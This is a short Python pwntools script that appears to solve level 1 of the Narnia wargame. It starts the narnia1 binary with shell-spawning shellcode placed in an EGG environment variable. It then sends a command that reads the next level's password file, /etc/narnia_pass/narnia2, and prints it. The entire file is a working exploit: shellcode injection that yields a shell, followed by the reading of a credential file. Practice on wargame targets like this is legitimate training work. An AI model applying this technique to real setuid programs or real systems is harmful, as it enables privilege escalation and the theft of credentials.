from pwn import *

p = process('/narnia/narnia1',env={"EGG":asm(shellcraft.sh())}) # 32 bit shellcode required

p.recvuntil(b'$')
p.sendline(b'cat /etc/narnia_pass/narnia2')
print('\nnarnia2 pass: ' + p.recvline().decode())

p.close()
